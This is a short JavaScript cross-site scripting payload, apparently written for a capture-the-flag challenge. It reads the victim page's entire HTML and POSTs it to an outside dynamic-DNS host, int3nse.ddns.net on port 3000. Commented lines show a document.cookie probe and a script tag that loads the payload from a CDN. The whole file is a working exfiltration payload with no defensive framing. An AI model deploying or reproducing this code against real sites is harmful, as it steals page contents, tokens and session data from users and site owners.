(()=>{
  // alert(document.cookie);
  // <script src="https://cdn.jsdelivr.net/gh/xslendix/ctff@main/xss.js"></script>
  var data = new FormData();
  data.append('data', document.documentElement.innerHTML);

  var xhr = new XMLHttpRequest();
  xhr.open('POST', 'http://int3nse.ddns.net:3000', true);
  xhr.onload = function () {
  };
  xhr.send(data);
})()
